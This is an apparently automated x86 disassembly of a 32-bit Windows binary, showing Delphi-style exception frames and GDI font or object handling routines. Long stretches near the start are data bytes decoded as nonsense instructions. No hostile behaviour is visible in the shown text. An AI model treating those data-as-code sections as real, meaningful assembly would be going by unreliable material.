frstor [ esi ]
and [ edx ] al
and al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
test al 0x20
inc edx
add [ edx ] bh
and [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0x21
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
inc edx
add [ ecx ] dl
inc edx
add [ eax ] ch
add [ eax ] al
add [ eax - 0x7c ] ch
inc ecx
add [ esp + esi - 0x5293ffc0 ] bl
inc ecx
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
pushfd
stosd [ edi ]
inc ecx
add [ esp + ebp * 4 + 0x5bb80041 ] ch
inc edx
add al cl
stosd [ edi ]
inc ecx
add ah bh
lodsd [ esi ]
inc ecx
add [ eax + 0x5b ] cl
inc edx
add [ edx + ebp + 0x40 ] dl
add [ esp + ebx * 2 ] al
inc edx
add [ edx + ebp + 0x40 ] dl
add [ edx + ebp + 0x40 ] dl
add [ ebp + ebx * 2 + 0x42 ] cl
add [ eax + 0x5d ] dl
inc edx
add [ edx + ebp + 0x40 ] dl
add al dl
pop ebp
inc edx
add [ edx + ebp + 0x40 ] dl
add [ esi + ebx * 2 ] dh
inc edx
add [ eax ] bh
pop esi
inc edx
add [ edx + ebp + 0x40 ] dl
add [ eax + 0x5e ] cl
inc edx
add [ eax ] dl
pop ebx
inc edx
add [ ebp + ebx * 2 + 0x42 ] dl
add ah bl
pop ebp
inc edx
add [ edx + ebp + 0x40 ] dl
add [ edx + ebp + 0x40 ] dl
add [ edx + ebp + 0x40 ] dl
add [ edx + ebp + 0x40 ] dl
add [ ecx ] al
add ch bh
[ eax + 0x800425d ]
add [ eax ] dl
pop ds
imul ebp [ esi + 0x67 ] 0x40119400
jb r-xdata
jae r-xdata
jae r-xdata
push ebx
je r-xdata
add ecx [ ebp + 0x73 ]
push es
add dh dh
pop ds
inc edx
add [ ecx ] al
add [ eax ] al
outsb
add [ si + 0x4011 ] dl
add [ eax ] al
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x11
inc ebp
jbe r-xdata
inc edx
add [ eax + edx + 0x40 ] ch
xchg esp eax
adc [ eax ] eax
adc [ edi ] bl
outsb
je r-xdata
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
push esp
push eax
jb r-xdata
add [ 0x67617453 ] al
push cs
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
je r-xdata
adc [ eax ] eax
nop
int3
sub_422115
push esp
inc edi
jb r-xdata
push ebp
and [ edx ] eax
arpl [ ecx ] sp
inc edx
add [ ebp + 0x21 ] ch
inc edx
add [ ebp + 0x21 ] al
inc edx
add [ ebp + 0x21 ] cl
inc edx
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x7ab8cd12 ] ah
jo r-xdata
aam 0x11
and [ edx ] eax
inc ebp
and [ edx ] eax
dec ebp
and [ edx ] eax
add [ eax ] eax
add [ eax ] al
mov [ 0x7ab8cd12 ] eax
imul esp [ ebx - 0x73 ] 0x21240040
inc edx
add [ edi ] al
or [ edi + eax * 2 + 0x72 ] dl
popad
jo r-xdata
int 0xb8
jpe r-xdata
imul esp [ ebx - 0x58 ] 0xec004220
test [ ecx ] al
add [ eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
inc edx
add [ edx ] bh
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] bl
and al [ edx ]
sub al 0x22
inc edx
add [ eax + eax ] ch
add [ eax ] al
push 0x9c004184
xor al 0x40
add [ ebp + ebp * 4 + 0x41 ] ch
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
dec eax
inc dx
add [ eax + 0x66 ] bh
inc edx
add [ eax ] dh
insd
inc edx
add [ edx + ebp * 2 + 0x42 ] dh
add ah bh
lodsd [ esi ]
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x1800421a ] cl
add [ eax ] al
add [ edx ] al
add ch bh
sbb edx 0x0
ror [ edi + 0x60 ] 0xb2
fnstsw [ edx + 0x21 ]
inc edx
add [ eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x4221fcc0 ] cl
add [ esi + 0x4221 ] cl
aam 0x11
add [ eax ] al
add [ edx ] cl
sub [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
cld
and [ edx ] eax
mov fs [ ecx ]
inc edx
add [ eax ] al
imul esp [ ebx + 0x73 ] 0xcc900000
add eax 0xffffffd8
jmp sub_426a44
sub_422222
cld
push esp
push 0x42
add [ eax ] bl
imul eax [ edx ] 0x8
push esp
push eax
imul esp [ ebx + 0x74 ] 0x8d657275
inc eax
add [ edx ] bh
inc edx
add [ edi ] al
or [ eax + edx * 2 + 0x69 ] dl
arpl [ ebp + esi * 2 + 0x72 ] si
cld
and [ edx ] eax
in al dx
test [ ecx ] al
add [ eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
inc edx
add [ edi ] cl
push esp
dec ebp
je r-xdata
imul esp [ ebx + 0x73 ] 0xa8900000
and al [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x22
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
and al [ edx ]
pop esp
add [ eax ] al
add [ eax ] al
push ds
inc edx
add [ esp + esi + 0x34a80040 ] bl
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
inc esp
imul bp [ ebp + 0x43 ] 0x6e61
jbe r-xdata
add ah bh
lodsd [ esi ]
inc ecx
add [ eax + 0x5b ] cl
inc edx
add [ edx + esi * 2 ] ch
inc edx
add [ esp + ebx * 2 ] al
inc edx
add [ ebx + esi * 2 + 0x73bc0042 ] ah
inc edx
add [ eax + 0x74 ] dl
inc edx
add [ eax + 0x5d ] dl
inc edx
add ah bl
je r-xdata
imul bp [ ebp + 0x49 ] 0x616d
nop
or [ edx + eax * 2 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0x42 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0x42 ] ch
add [ eax ] dh
add [ eax ] al
add [ eax + 0x42 ] bl
add [ esp + esi - 0x5293ffc0 ] bl
inc ecx
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
push 0xac004271
lodsb [ esi ]
inc ecx
add [ eax - 0x67ffbda5 ] bh
jno r-xdata
push ebx
push 0x64657261
dec ecx
insd
popad
lea eax [ bx + si ]
test al 0x23
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x240042 ] ch
lodsb [ esi ]
jae r-xdata
and al 0x42
add [ edi ] al
or [ ebp + ecx * 2 + 0x65 ] edx
je r-xdata
add [ ebp + esi * 2 + 0x79e80042 ] bh
inc edx
add [ esi + ebx * 2 ] dh
inc edx
add ah dl
jpe r-xdata
pop ebp
inc edx
jo r-xdata
and al [ edx ]
pop es
andps xmm1 [ ebp + 0x65 ]
je r-xdata
xor al 0x83
imul bp [ ebp + 0x8 ] 0x4224
add [ eax ] ah
and [ edx ] eax
add [ eax ] al
inc edx
add al bl
jpe r-xdata
inc edx
add [ eax + 0xc004283 ] dl
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x616d4970
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ ebx + eax * 4 ] dh
imul bp [ ebp - 0x75 ] 0x7cc0
insb
push ds
inc edx
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
add [ esp + ebp * 4 - 0x534bffbf ] ch
inc ecx
add al cl
stosd [ edi ]
inc ecx
add ah dh
inc esi
inc edx
add al ah
inc esi
inc edx
add [ esi + eax * 2 ] dl
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ edx + ebp + 0x40 ] dl
add [ esp + edx * 2 ] cl
in al dx
imul bp [ ebp + 0x43 ] 0x6e61
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
inc edx
add [ eax + eax ] dh
add [ eax ] al
pop esp
and [ edx ] al
pushfd
xor al 0x40
add [ ebp + ebp * 4 + 0x41 ] ch
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
movsb [ edi ] [ esi ]
cmpsd [ esi ] [ edi ]
inc edx
add [ esp + ebp * 4 + 0x5bb80041 ] ch
inc edx
add ah dl
cmpsd [ esi ] [ edi ]
inc edx
add ah bh
lodsd [ esi ]
inc ecx
add [ eax + 0x5b ] cl
inc edx
add [ eax + ebp * 4 ] dh
inc edx
add [ esp + ebx * 2 ] al
inc edx
add [ eax + ebp * 4 + 0x42 ] dh
add [ eax + 0x4c0042a8 ] ah
pop ebp
inc edx
add [ eax + 0x5d ] dl
inc edx
add [ eax + ebp * 4 + 0x5dd00042 ] dh
inc edx
add [ eax ] bh
stosd [ edi ]
inc edx
add [ esi + ebx * 2 ] dh
inc edx
add [ eax - 0x55 ] dl
inc edx
add [ ebx + ebp * 4 + 0x42 ] dl
add [ eax + 0x5e ] cl
inc edx
add [ eax - 0x59 ] dl
inc edx
add [ ebp + ebx * 2 + 0x42 ] dl
add ah bl
pop ebp
inc edx
add ah dh
test eax 0xab6c0042
inc edx
add [ ebx + ebp * 4 - 0x5457ffbe ] dl
inc edx
add [ 0x6f634954 ] al
outsb
mov eax eax
cld
inc edx
add [ edi ] al
add eax 0x6f634954
outsb
mov [ esi ] fs
inc edx
add [ eax ] ah
and [ edx ] eax
add [ eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
imul esp [ ebx + 0x73 ] 0xc08b0000
xor [ esi ] ah
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] dh
inc edx
add [ eax ] bl
add [ eax ] al
add ah bh
and al [ edx ]
pushfd
xor al 0x40
add [ eax - 0x53ffbfcc ] ch
xor al 0x40
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ eax ] cl
cmpsd [ esi ] [ edi ]
inc edx
add [ eax ] bh
cmpsd [ esi ] [ edi ]
inc edx
add [ edx ] cl
push esp
dec ecx
arpl [ edi + 0x6e ] bp
dec ecx
insd
popad
nop
mov [ esi ] fs
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x3c004225
add [ eax ] al
add [ eax + 0x42 ] bl
add [ esp + esi - 0x5293ffc0 ] bl
inc ecx
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
and [ esi - 0x5353ffbe ] cl
inc ecx
add [ eax + 0x5c00425b ] bh
mov es [ edx ]
cld
lodsd [ esi ]
inc ecx
add [ eax ] dh
nop
inc edx
add [ eax + 0x4004290 ] dh
pop esp
inc edx
add [ ebx + edx * 4 + 0x42 ] ah
add [ eax ] bl
xchg esp eax
inc edx
add [ eax - 0x6c ] bl
inc edx
add [ eax + 0x5d ] dl
inc edx
add [ esp + edx * 4 - 0x66ffffbe ] dh
inc edx
add ah bh
mov al [ 0xffffffffa1d00042 ]
inc edx
add [ eax ] bh
pop esi
inc edx
add ah dh
mov [ 0xffffffffa3480042 ] al
inc edx
add [ eax + 0x5400428d ] bh
pop ebp
inc edx
add ah bl
pop ebp
inc edx
add [ edi + edx * 4 + 0x42 ] bh
add [ eax - 0x5a ] ah
inc edx
add al bh
xchg esi eax
inc edx
add [ eax - 0x5a ] ch
inc edx
add al cl
xchg ebx eax
inc edx
add [ eax ] ch
xchg esp eax
inc edx
add ah al
lahf
inc edx
add [ edi ] al
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x4225c470
add [ edi ] al
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x42254870
add [ eax ] ah
and [ edx ] eax
add [ eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
and eax 0x42
imul esp [ ebx + 0x73 ] 0x24e80000
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
and al 0x42
add [ eax + eax ] dh
add ah bh
and al [ edx ]
pushfd
xor al 0x40
add [ eax - 0x53ffbfcc ] ch
xor al 0x40
inc edx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
add [ eax ] dh
jl r-xdata
add [ eax ] al
cld
and al [ edx ]
pushfd
xor al 0x40
add [ eax - 0x53ffbfcc ] ch
xor al 0x40
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ ebp + ebp * 2 + 0x6de80042 ] ch
inc edx
add [ esi ] cl
push esp
dec ebp
je r-xdata
and eax [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
and eax [ edx ]
and al 0x0
xor al 0x40
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add ah ch
imul esp [ ebx + 0x73 ] 0xc08b0000
dec eax
and eax [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
and eax [ edx ]
or [ eax ] al
add [ eax ] al
inc eax
adc [ eax ] eax
pushfd
xor al 0x40
add [ eax - 0x53ffbfcc ] ch
xor al [ eax ]
push esp
sub al [ eax ]
or al 0x54
jae r-xdata
jae r-xdata
imul esp [ ebx + 0x73 ] 0xc0850000
je r-xdata
lea eax [ bx + si ]
dec eax
and eax 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les esp [ 0x42 ]
popad
jo r-xdata
or [ edi + 0x72 ] al
popad
add [ eax ] ah
jno r-xdata
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
aam 0x70
inc edx
and al [ edx ]
cmp edi esi
inc [ ebx + ebx * 8 - 0x3974f882 ]
jne r-xdata
retn
cmp eax [ rw-data ]
add [ eax + 0x78 ] bh
inc edx
add [ eax + 0x75 ] al
inc edx
add [ ecx + edi * 2 ] bh
inc edx
add [ esi + edi * 2 + 0x7f080042 ] al
inc edx
add [ ecx ] cl
push esp
dec ebp
je r-xdata
add [ ebp + ebx * 2 + 0x42 ] dl
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
push eax
call DeleteObject
pop esi
pop ebx
retn
call sub_4035c8
mov eax esi
je r-xdata
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_42272e
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x27 ] bh
inc edx
add [ eax + eax ] ah
add [ eax ] al
inc eax
adc [ eax ] eax
pushfd
xor al 0x40
add [ eax - 0x53ffbfcc ] ch
xor al 0x40
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add ah bl
daa
inc edx
add [ eax ] dl
push esp
push edx
jae r-xdata
cmp edi esi
inc [ ebx + ebx * 8 - 0x3974f882 ]
jne r-xdata
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
pop esi
pop ebx
retn
call sub_4035c8
mov eax esi
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
je r-xdata
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
retn
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_4227a0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x20 ] cx
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_4227dc
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_422818
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x20 ]
mov eax ebx
call sub_42278c
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_422800
xor edx edx
push ebp
push sub_4228ec
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp si [ eax + 0xc ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4228f3
mov eax [ ebp - 0x4 ]
call sub_42280c
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20 ]
add eax 0x10
call sub_4027c4
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ eax ] edx
xor edx edx
mov [ eax + 0x4 ] edx
mov edx [ ebx ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] si
mov edx [ ebp - 0x4 ]
movzx ecx [ edx + 0x20 ]
lea edx [ eax + 0x10 ]
mov eax ebx
call sub_4029c0
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x20 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
add eax 0x10
call sub_408160
test al al
je r-xdata
sub_4228fc
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_422800
xor ecx ecx
push ebp
push sub_422983
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x10 ]
dec [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
sete [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_42280c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ eax ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov eax edx
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ eax ] edx
sub_4229ac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_422800
xor eax eax
push ebp
push sub_422a15
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_422818
mov esi eax
mov [ ebx + 0x10 ] esi
cmp edi esi
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4228fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422a1c
mov eax [ ebp - 0x4 ]
call sub_42280c
retn
mov eax ebx
mov si 0xfffd
call sub_403450
sub_422a24
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_422800
xor eax eax
push ebp
push sub_422a80
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x10 ]
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422a87
mov eax [ ebp - 0x4 ]
call sub_42280c
retn
inc [ edi + 0x4 ]
mov [ esi + 0x10 ] edi
mov eax esi
mov si 0xfffd
call sub_403450
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4228fc
sub_422a90
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_422800
xor edx edx
push ebp
push sub_422aef
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422af6
mov eax [ ebp - 0x4 ]
call sub_42280c
retn
mov esi ebx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x0
jge r-xdata
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x8 ] eax
sub_422afc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_41a978
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_422b99
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41a5d0
mov ebx eax
mov eax ebx
call sub_424164
inc [ ebp - 0x4 ]
mov eax ebx
call sub_4245b8
mov eax [ rw-data ]
call sub_422a90
mov eax [ rw-data ]
call sub_422a90
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422ba0
mov ebx [ ebp - 0x4 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
call sub_41a9dc
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_41a5d0
call sub_42446c
inc esi
dec ebx
jne r-xdata
sub_4231ef
dec [ ebx ]
add [ eax ] al
add [ edi + 0x45 ] cl
dec ebp
pop edi
inc ebx
dec eax
inc ecx
push edx
push ebx
inc ebp
push esp
add [ edx + 0x11 ] ch
mov ecx rw-data
call sub_41a080
retn
sub_423220
push ebx
push esi
push edi
add esp 0xffffffa0
mov ebx edx
mov esi eax
push esi
mov edi ebx
mov esi rw-data
mov ecx 0xb
[ edi ] [ esi ]
pop esi
test esi esi
je r-xdata
add esp 0x60
pop edi
pop esi
pop ebx
retn
push esp
push 0x3c
push esi
call GetObjectA
test eax eax
je r-xdata
mov eax [ esp ]
mov [ ebx + 0x4 ] eax
cmp [ esp + 0x10 ] 0x2bc
jl r-xdata
cmp [ esp + 0x14 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x1
cmp [ esp + 0x15 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x2
cmp [ esp + 0x16 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x4
mov al [ esp + 0x17 ]
mov [ ebx + 0xa ] al
lea eax [ esp + 0x3c ]
lea edx [ esp + 0x1c ]
mov ecx 0x20
call sub_402d68
lea edx [ esp + 0x3c ]
lea eax [ ebx + 0xb ]
mov cl 0x1f
call sub_402b58
mov al [ esp + 0x1b ]
and al 0xf
dec al
je r-xdata
or [ ebx + 0x9 ] 0x8
mov [ ebx + 0x8 ] 0x2
jmp r-xdata
dec al
jne r-xdata
mov [ ebx ] esi
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
sub_4232d4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_422818
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0xff000008
mov eax [ rw-data ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_423328
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_4228fc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_42336c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41abc8
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_42302c
xor eax eax
push ebp
push sub_423427
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_42302c
xor eax eax
push ebp
push sub_42340a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422a24
mov edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4234a8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423411
mov eax [ ebp - 0x8 ]
call sub_42303c
retn
mov eax ebx
call sub_42372c
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_423748
sub_423458
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42302c
xor eax eax
push ebp
push sub_42349d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4229ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4234a4
mov eax [ ebp - 0x4 ]
call sub_42303c
retn
sub_4234bc
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
xor edx edx
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x44 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_423645
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
